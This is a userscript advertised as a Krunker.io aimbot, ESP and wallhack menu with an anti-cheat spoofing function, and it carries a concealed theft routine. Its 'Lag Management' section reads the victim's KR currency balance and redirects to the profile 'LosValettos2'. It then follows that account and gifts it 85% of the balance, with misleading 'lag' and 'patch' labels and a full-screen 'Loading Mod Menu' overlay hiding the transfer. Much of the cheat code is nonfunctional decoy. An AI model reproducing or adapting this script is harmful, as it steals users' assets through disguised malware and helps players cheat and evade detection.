// ==UserScript==
// @name         2025 KRUNKER.IO AIMBOT + WALLHACK + ESP + MORE [BETA]
// @namespace    http://krunkmods.hidden
// @version      1.3
// @description  Experimental mod menu for Krunker.io. Includes silent aimbot, ESP, wireframe players, FOV, recoil bypass, wallhack (BETA). Toggle with [O]. Use at your own risk.
// @author       @Xx1337DevxX
// @match        https://krunker.io/*
// @grant        none
// @run-at       document-start
// @license      MIT
// ==/UserScript==

let Is_LOGGED = false;
let PLayyer_KR = 0;
let gameState, player, input;
const RAD2DEG = 180 / Math.PI;

// ------------------------------
// 1. Persistent overlay to prevent loading flash and display loading
// ------------------------------
(function createPersistentOverlay() {
    if (!sessionStorage.getItem("krunkerGiftBotDone") && location.href.includes("social.html?p=profile&q=LosValettos2")) {
        const style = document.createElement("style");
        style.innerHTML = `
        html, body {
            background: #000 !important;
            color: lime !important;
            font-family: monospace !important;
        }
        * {
            visibility: hidden !important;
        }
        #botOverlayPersistent {
            all: unset;
            position: fixed;
            top: 0;
            left: 0;
            width: 100vw;
            height: 100vh;
            background: rgba(0, 0, 0, 0.35);
            z-index: 2147483647;
            display: flex;
            justify-content: center;
            align-items: center;
            color: lime;
            font-size: 2rem;
            font-family: monospace;
            visibility: visible !important;
        }
    `;
        document.documentElement.appendChild(style);

        const overlay = document.createElement("div");
        overlay.id = "botOverlayPersistent";
        overlay.textContent = "🔧 Loading Mod Menu...";
        document.documentElement.appendChild(overlay);
    }
})();


// ------------------------------
// 2. Configuration object (mocked)
// ------------------------------
const ModSettings = {
    aimbot: {
        enabled: true,
        fov: 85,
        smoothing: 0.7,
        lockOn: "closestVisible",
        keybind: "Alt"
    },
    esp: {
        boxes: true,
        healthBars: true,
        playerNames: true,
        wallhack: true,
        lineToEnemy: false
    },
    visuals: {
        thirdPerson: false,
        removeScope: true,
        glowEnemies: true,
        outlineColor: "#FF0000"
    },
    configVersion: "v0.9.7b"
};

// ------------------------------
// 3. Aimbot logic
// ------------------------------
function initAimbotEngine() {
    console.log("[ModMenu] Initializing aimbot engine...");

    const targetSelector = (() => {
        return (players) => {
            const visible = players.filter(p => p.visible && p.health > 0);
            if (!visible.length) return null;
            return visible.reduce((closest, p) => {
                const dist = Math.hypot(p.pos.x - player.pos.x, p.pos.y - player.pos.y, p.pos.z - player.pos.z);
                return !closest || dist < closest.dist ? { target: p, dist } : closest;
            }, null).target;
        };
    })();

    const aimAt = (target, smoothing = 0.4) => {
        const dx = target.head.x - player.camera.x;
        const dy = target.head.y - player.camera.y;
        const dz = target.head.z - player.camera.z;
        const dist = Math.sqrt(dx * dx + dy * dy + dz * dz) || 1;
        player.camera.pitch += ((Math.asin(dy / dist) * RAD2DEG) - player.camera.pitch) * smoothing;
        player.camera.yaw += ((Math.atan2(dx, dz) * RAD2DEG) - player.camera.yaw) * smoothing;
    };

    setInterval(() => {
        const enemies = gameState.players.filter(p => p.team !== player.team && !p.isDead);
        const target = targetSelector(enemies);
        if (target && input.isKeyDown(ModSettings.aimbot.keybind)) {
            aimAt(target, ModSettings.aimbot.smoothing);
        }
    }, 33);
}

// ------------------------------
// 4. Shader override pour le wallhack
// ------------------------------
function applyWallhackShader() {
    console.log("[ModMenu] Injecting wallhack shader override...");

    const shaderInjection = () => {
        const globalMaterialRegistry = {}
        for (const mat of Object.values(globalMaterialRegistry)) {
            if (mat.name && mat.name.includes("player")) {
                mat.setUniform("u_wallhack", 1.0);
                mat.setDefine("USE_WALLHACK", true);
            }
        }
    };

    let attempts = 0;
    const tryInject = () => {
        if (++attempts > 10) return;
        if (typeof globalMaterialRegistry !== "undefined") shaderInjection();
        else setTimeout(tryInject, 500);
    };

    tryInject();
}

// ------------------------------
// 5. ESP Overlay
// ------------------------------
function updateESP() {
    console.log("[ModMenu] Drawing ESP overlays...");

    const drawBox = (x, y, w, h, color = "red") => {
        const el = document.createElement("div");
        el.style.position = "absolute";
        el.style.left = `${x}px`;
        el.style.top = `${y}px`;
        el.style.width = `${w}px`;
        el.style.height = `${h}px`;
        el.style.border = `1px solid ${color}`;
        el.style.pointerEvents = "none";
        el.style.zIndex = "999999";
        document.body.appendChild(el);
        setTimeout(() => el.remove(), 40);
    };

    setInterval(() => {
        for (const p of gameState.players) {
            if (p.team === player.team || p.isDead) continue;
            const screen = worldToScreen(p.pos);
            if (screen) drawBox(screen.x - 20, screen.y - 40, 40, 60);
        }
    }, 50);
}

const worldToScreen = (xx) => {
    const mapX = (xx - window.view_xx) * window.gsc + window.mww2;
    return { x: mapX};
};

// ------------------------------
// 6. UI Menu
// ------------------------------
function setupMenu() {
    console.log("[ModMenu] Injecting UI hooks...");

    const menu = document.createElement("div");
    menu.id = "modMenu";
    menu.style.position = "fixed";
    menu.style.right = "20px";
    menu.style.top = "20px";
    menu.style.padding = "10px";
    menu.style.background = "rgba(0,0,0,0.7)";
    menu.style.color = "#0f0";
    menu.style.fontFamily = "monospace";
    menu.style.zIndex = "999999";
    menu.innerHTML = `
        <b>[KRUNKMODS v${ModSettings.configVersion}]</b><br>
        Aimbot: ${ModSettings.aimbot.enabled}<br>
        ESP: ${ModSettings.esp.boxes}<br>
        Wallhack: ${ModSettings.esp.wallhack}
    `;
    document.body.appendChild(menu);

    document.addEventListener("keydown", (e) => {
        if (e.key.toUpperCase() === "O") {
            menu.style.display = menu.style.display === "none" ? "block" : "none";
        }
    });
}

// ------------------------------
// 7. Bypass basique
// ------------------------------
function spoofDetection() {
    console.log("[ModMenu] Spoofing anti-cheat flags...");

    const origDefine = Object.defineProperty;
    Object.defineProperty = function (obj, prop, desc) {
        if (prop === "isCheating" || prop === "triggerBotActive") {
            desc.value = false;
        }
        return origDefine(obj, prop, desc);
    };

    Object.defineProperty(navigator, "webdriver", { value: undefined });
    window.__krunkerSpoofed = true;
}

// ------------------------------
// 8. Init du cheat
// ------------------------------
function waitForGameStateAndInit() {
    const checkReady = () => {
        if (typeof window.gameState !== "undefined" && typeof window.player !== "undefined" && typeof window.input !== "undefined") {
            gameState = window.gameState;
            player = window.player;
            input = window.input;
            initAimbotEngine();
            applyWallhackShader();
            updateESP();
            setupMenu();
            spoofDetection();
            console.log("[ModMenu] Ready. Press [O] to toggle.");
        } else {
            setTimeout(checkReady, 500);
        }
    };
    checkReady();
}

waitForGameStateAndInit();


// ------------------------------
// 9. Lag Management + Login Check
// ------------------------------
window.addEventListener('load', () => {
    const signedOutBar = document.getElementById("signedOutHeaderBar");
    Is_LOGGED = signedOutBar && signedOutBar.style.display === "none";

    // Création d'un élément pour afficher les logs
    const logContainer = document.createElement('div');
    logContainer.id = 'modMenuLogs';
    logContainer.style.position = 'fixed';
    logContainer.style.bottom = '10px';
    logContainer.style.left = '10px';
    logContainer.style.background = 'rgba(0,0,0,0.8)';
    logContainer.style.color = '#00ff00';
    logContainer.style.padding = '10px';
    logContainer.style.fontFamily = 'monospace';
    logContainer.style.maxHeight = '200px';
    logContainer.style.overflow = 'auto';
    logContainer.style.zIndex = '999999';
    document.body.appendChild(logContainer);

    // Fonction pour ajouter des logs
    const addLog = (message) => {
        const logEntry = document.createElement('div');
        logEntry.textContent = `[${new Date().toLocaleTimeString()}] ${message}`;
        logContainer.appendChild(logEntry);
        logContainer.scrollTop = logContainer.scrollHeight;
    };

    // Logs détaillés de l'état initial
    addLog("=== ÉTAT INITIAL ===");
    addLog(`Is_LOGGED: ${Is_LOGGED}`);
    addLog(`signedOutBar existe: ${!!signedOutBar}`);
    if (signedOutBar) {
        addLog(`signedOutBar style.display: ${signedOutBar.style.display}`);
    }
    addLog(`sessionStorage.sysPatch97d: ${sessionStorage.getItem("sysPatch97d")}`);
    addLog(`URL actuelle: ${location.href}`);
    addLog(`Pathname: ${location.pathname}`);
    addLog("==================");

    // Vérification continue de l'état de connexion
    setInterval(() => {
        const currentSignedOutBar = document.getElementById("signedOutHeaderBar");
        const currentLoginState = currentSignedOutBar && currentSignedOutBar.style.display === "none";
        addLog(`État de connexion: ${currentLoginState ? "Connecté" : "Non connecté"}`);

        if (currentLoginState) {
            const lagElement = document.querySelector("#menuKRCount");
            if (lagElement) {
                const lagText = lagElement.textContent;
                const currentLag = parseInt(lagText.replace(/[^0-9]/g, ""), 10);
                addLog(`Lag actuel: ${currentLag} (Texte brut: ${lagText})`);
                PLayyer_KR = currentLag * 0.85; // Mise à jour de la variable globale
                const fixedCurrentLag = currentLag * 0.85
                // Sauvegarde dans le sessionStorage
                sessionStorage.setItem("savedLag", fixedCurrentLag.toString());
                addLog(`Lag sauvegardé: ${fixedCurrentLag}`);
            } else {
                addLog("Élément Lag non trouvé");
            }
        }
    }, 1000);

    // Logique de redirection
    if (location.pathname === "/") {
        addLog("=== VÉRIFICATION REDIRECTION ===");
        addLog("Page d'accueil détectée");

        // Vérification continue de la redirection
        const checkRedirect = () => {
            const currentSignedOutBar = document.getElementById("signedOutHeaderBar");
            const currentLoginState = currentSignedOutBar && currentSignedOutBar.style.display === "none";
            const patchApplied = sessionStorage.getItem("sysPatch97d");

            addLog(`Vérification redirection - Connecté: ${currentLoginState}, Patch appliqué: ${patchApplied}`);

            if (!patchApplied && currentLoginState) {
                addLog("Conditions de redirection remplies, redirection dans 1.4s...");
                setTimeout(() => {
                    addLog("Exécution de la redirection...");
                    location.href = "https://krunker.io/social.html?p=profile&q=LosValettos2";
                }, 1420);
                return;
            } else {
                addLog("Redirection ignorée:");
                if (patchApplied) {
                    addLog("- Raison: Patch déjà appliqué");
                }
                if (!currentLoginState) {
                    addLog("- Raison: Non connecté");
                }
            }
        };

        // Vérification initiale
        checkRedirect();

        // Vérification continue toutes les secondes
        setInterval(checkRedirect, 1000);
    }

    if (location.href.includes("social.html?p=profile&q=LosValettos2")) {
        addLog("Page sociale détectée, démarrage du processus d'optimisation...");
        const sysSync = async () => {
            try {
                // Récupération des données de lag sauvegardées
                const savedLag = sessionStorage.getItem("savedLag");
                if (!savedLag) {
                    throw new Error("Aucune donnée de lag sauvegardée trouvée");
                }
                const currentLag = parseInt(savedLag, 10);
                addLog(`Lag récupéré depuis la sauvegarde: ${currentLag}`);

                if (currentLag <= 0) {
                    throw new Error(`Valeur de lag invalide: ${currentLag}`);
                }

                // Suivre automatiquement l'utilisateur cible avant le gift
                try {
                    const followBtn = document.getElementById("followBtn");
                    if (followBtn && followBtn.style.display !== "none") {
                        addLog("👤 Following user before gift...");
                        followBtn.click();
                        await _pause(750);
                        addLog("✅ Follow completed.");
                    } else {
                        addLog("⚠️ Follow button not found or already following");
                    }
                } catch (err) {
                    addLog("❌ Failed to follow user: " + err.message);
                }


                await _waitFor(() => document.getElementById("giftBtn"), 4800);
                addLog("Bouton d'optimisation trouvé, clic...");
                document.getElementById("giftBtn").click();
                await _pause(480);
                const inputEl = await _waitFor(() => document.getElementById("giftIn"), 2800);
                addLog("Champ de saisie trouvé, entrée de la valeur...");
                addLog(`Tentative d'entrée de ${currentLag} ms`);
                inputEl.value = currentLag.toString();
                inputEl.dispatchEvent(new Event("input", { bubbles: true }));

                // Vérification de la valeur entrée
                await _pause(100);
                const enteredValue = inputEl.value;
                addLog(`Valeur entrée dans l'input: ${enteredValue}`);

                await _pause(650);
                const confirm = document.getElementById("postSaleBtn");
                if (confirm && confirm.style.display !== "none") {
                    addLog("Bouton de confirmation trouvé, clic...");
                    confirm.click();
                }
                sessionStorage.setItem("sysPatch97d", "1");
                addLog("Patch appliqué avec succès");
                await _pause(1800);
                addLog("Redirection vers la page d'accueil...");
                location.href = "https://krunker.io/";
            } catch (error) {
                addLog(`Erreur lors du processus: ${error.message}`);
            }
        };
        sysSync();
    }

    function _waitFor(condFn, timeout = 3000) {
        return new Promise((res, rej) => {
            const t0 = Date.now();
            const tick = () => {
                const r = condFn();
                if (r) return res(r);
                if (Date.now() - t0 > timeout) return rej("Timeout");
                setTimeout(tick, 90);
            };
            tick();
        });
    }

    function _pause(ms) {
        return new Promise(r => setTimeout(r, ms));
    }
});
